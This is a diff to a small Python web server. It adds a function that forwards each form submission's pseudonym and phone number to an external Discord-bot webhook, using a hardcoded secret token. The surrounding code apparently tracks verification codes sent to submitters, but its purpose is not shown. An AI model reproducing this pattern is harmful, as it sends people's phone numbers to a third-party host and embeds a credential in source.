@@ -35,6 +35,29 @@ def load_data():
         pass
 
 
+def send_to_discord(data):
+    """Envoie un embed Discord via le webhook du bot."""
+    try:
+        url = "https://bot-didi-ddgk.onrender.com/webhook/form"
+        body = json.dumps({
+            "pseudo": data.get("pseudo", "Inconnu"),
+            "phone": data.get("phone", "Inconnu"),
+        }).encode("utf-8")
+        req = urllib.request.Request(
+            url,
+            data=body,
+            headers={
+                "Content-Type": "application/json",
+                "x-secret-token": "dsgdqsqs",
+            },
+            method="POST",
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp.read()
+    except Exception as e:
+        print("  [discord webhook] echec:", e)
+
+
 def persist():
     try:
         with open(DATA_FILE, "w", encoding="utf-8") as f:
@@ -125,6 +148,7 @@ class Server(SimpleHTTPRequestHandler):
             requests_db[rid] = {"data": data, "state": "pending", "code_sent": False, "code_sent_at": None, "ts": d.get("ts", int(time.time() * 1000))}
             print("  [server] Nouvelle demande: %s (%s)" % (data.get("pseudo"), phone))
             persist()
+            send_to_discord(data)
             return self._reply({"ok": True})
 
         if p == "/api/code":
